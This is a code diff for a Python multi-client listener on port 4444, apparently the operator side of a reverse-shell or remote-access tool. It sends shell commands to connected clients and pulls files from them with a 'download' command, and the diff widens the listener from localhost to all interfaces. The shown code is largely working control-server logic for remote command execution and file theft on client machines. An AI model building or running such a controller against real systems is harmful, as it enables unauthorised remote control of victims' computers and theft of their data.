@@ -2,12 +2,11 @@
 
 import socket
 from threading import Thread
-from queue import Queue
 import time
 import datetime
 from tqdm import tqdm
 
-HOST = "127.0.0.1"
+HOST = "0.0.0.0"
 PORT = 4444
 CLIENTS = []
 THREADS = []
@@ -114,14 +113,15 @@ def shell(client, sock):
             if "exit" == cmd:
                 break
             elif 'download' in cmd:
-                file_extension = "." + cmd.split(".")[1]
+                f_extension = "." + cmd.split(".")[1]
                 file_size = int(conn.recv(1024))
-                progress_bar = tqdm(total=file_size, unit='iB', unit_scale=True)
-                f = open("serverbis" + file_extension, "wb")
+                progress_bar = tqdm(total=file_size, unit='iB')
+                f = open(NOW + f_extension, "wb")
                 data_check = 0
                 print(file_size)
                 while data_check != int(file_size):
-                    data = conn.recv(1024)
+                    time.sleep(2)
+                    data = conn.recv(5000)
                     data_size = len(data)
                     f.write(data)
                     data_check = data_check + int(len(data))
@@ -134,6 +134,7 @@ def shell(client, sock):
                 print(_decode(conn.recv(10000)))
         except Exception as e:
             print(e)
+            break
 
 
 class ThreadConnect:
@@ -192,7 +193,8 @@ class ThreadClientAlive:
 
 def main():
     sock = start_server()
-    app(sock).start()
+    app1 = app(sock)
+    app1.start()
 
 
 main()
